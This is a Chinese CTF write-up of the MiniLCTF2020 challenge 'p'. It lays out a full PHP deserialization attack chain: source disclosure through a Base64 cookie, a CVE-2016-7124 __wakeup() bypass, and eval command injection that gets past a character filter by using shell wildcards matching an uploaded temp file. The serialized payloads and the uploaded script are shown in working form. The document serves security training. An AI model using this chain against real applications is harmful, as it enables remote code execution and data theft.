# MiniLCTF2020 - p

## 题目简述

应用把 Cookie `git` 做 Base64 解码后直接反序列化，并把对象的 `file` 属性交给 `highlight_file()`。读取 `classes.php` 后可发现 `github::__destruct()` 中存在 `eval($this->cmd)`；但 `__wakeup()` 要求 `X-Real-IP` 为 `127.0.0.1`，命令字符又受到严格过滤。利用点是 PHP 7.0.9 的 `__wakeup()` 属性计数绕过，加上上传临时文件与 shell 通配符。

## 解题过程

默认 Cookie 解码后是：

```text
O:5:"gitee":1:{s:4:"file";s:9:"index.php";}
```

先改成下面的对象并重新 Base64 编码，即可读取类定义：

```text
O:5:"gitee":1:{s:4:"file";s:11:"classes.php";}
```

目标镜像固定为 PHP 7.0.9。构造 `github` 对象时把声明的属性数写成 3，但只实际提供 `file`、`cmd` 两项，利用该版本的 CVE-2016-7124 跳过 `__wakeup()`。过滤允许字母 `p`、点、斜杠、问号、反引号和 PHP 短输出标签，因此可写成：

```text
O:6:"github":3:{s:4:"file";s:9:"index.php";s:3:"cmd";s:26:"?><?=`. /??p/p?p??????`;?>";}
```

同一次请求上传任意文件，内容写成 shell 脚本：

```sh
#!/bin/sh
cat /* | grep minil
```

PHP 在处理上传时会把文件暂存为 `/tmp/phpXXXXXX`。通配模式 `/??p/p?p??????` 正好匹配该路径，`.` 是 shell 的 source 内建命令，于是析构阶段的 `eval()` 退出 PHP 代码、执行临时脚本并通过 `<?= ... ?>` 输出结果。请求结束前临时文件仍存在，flag 因而出现在响应中。

## 方法总结

这类题不是单一反序列化漏洞，而是“读源码—跳过 `__wakeup()`—绕字符集—利用上传生命周期”的组合链。临时文件利用必须发生在同一请求中；`/tmp/phpXXXXXX` 的长度和命名规则也要与通配模式逐字符核对。
